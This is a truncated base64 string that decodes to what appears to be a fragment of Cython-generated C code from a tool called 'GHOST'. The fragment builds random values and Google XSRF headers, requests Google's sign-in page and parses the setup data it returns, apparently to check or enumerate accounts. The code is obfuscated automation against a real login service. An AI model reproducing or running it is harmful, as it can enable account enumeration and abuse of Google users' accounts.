B5eF90XzE2ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xOFs0XTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTkgPSBOVUxMO1xuICBpbnQgX19weXhfdF8yMDtcbiAgaW50IF9fcHl4X3RfMjE7XG4gIGludCBfX3B5eF90XzIyO1xuICBjaGFyIGNvbnN0ICpfX3B5eF90XzIzO1xuICBQeU9iamVjdCAqX19weXhfdF8yNCA9IE5VTEw7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInRsbCIsIDApO1xuICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGwgKilfX3B5eF90cF9uZXdfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHtcbiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICopUHlfTm9uZSk7XG4gICAgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICAgIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X3NlbGYgPSBfX3B5eF92X3NlbGY7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3Zfc2VsZik7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X3NlbGYpO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX3B5eF90XzggPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90Xzd9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKSgmUHlSYW5nZV9UeXBlKSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X3BmXzJ0dF81R0hPU1RfM3RsbF9nZW5leHByKCgoUHlPYmplY3QqKV9fcHl4X2N1cl9zY29wZSksIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgX19weXhfdF83ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8sIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX3B5eF92X24xID0gKChQeU9iamVjdCopX19weXhfdF83KTtcbiAgICAgIF9fcHl4X3RfNyA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX3B5eF90XzggPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF90XzZ9O1xuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKSgmUHlSYW5nZV9UeXBlKSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3BmXzJ0dF81R0hPU1RfM3RsbF8zZ2VuZXhwcigoKFB5T2JqZWN0KilfX3B5eF9jdXJfc2NvcGUpLCBfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgX19weXhfdF83ID0gX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfLCBfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgX19weXhfdl9uMiA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNyA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19weXhfdF84ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfdF81fTtcbiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KikoJlB5UmFuZ2VfVHlwZSksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX3B5eF9wZl8ydHRfNUdIT1NUXzN0bGxfNmdlbmV4cHIoKChQeU9iamVjdCopX19weXhfY3VyX3Njb3BlKSwgX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX3B5eF90XzUgPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XywgX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fcHl4X3ZfaG9zdCA9IF9fcHl4X3RfNTtcbiAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgODcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NlcHRfbGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXJfSVFfYXJfcV8wXzlfZW5fSVFfcV8wXzhfZW5fcSkgPCAoMCkpIF9fUFlYX0VSUigwLCA4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2NvbnRlbnRfdHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZSkgPCAoMCkpIF9fUFlYX0VSUigwLCA4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dvb2dsZV9hY2NvdW50c194c3JmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgODcsIF9fcHl4X0wzX2Vycm9yKVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNyA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnYik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDg4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19weXhfdF84ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgICAgICBfX3B5eF90XzcgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF83KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzggPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9O1xuICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMS1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgODgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgODgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdF80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDg3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19weXhfdl9oZTMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOCA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHtcbiAgICAgICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNCk7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19weXhfdF84ID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMSA6IDApXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWduaW59O1xuICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlMywgX19weXhfdF82LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKChQeU9iamVjdCopX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9yZXMxID0gX19weXhfdF81O1xuICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWFyY2gpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXMxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF84ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgICAgICBfX3B5eF90XzcgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF83KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzggPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZGF0YV9pbml0aWFsX3NldHVwX2RhdGFfcXVvdF9xdW8sIF9fcHl4X3RfNn07XG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgzLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3ZfbWF0Y2ggPSBfX3B5eF90XzU7XG4gICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF92X21hdGNoKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzkgPCAwKSkpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAobGlrZWx5KF9fcHl4X3RfOSkpIHtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF80ID0gX19weXh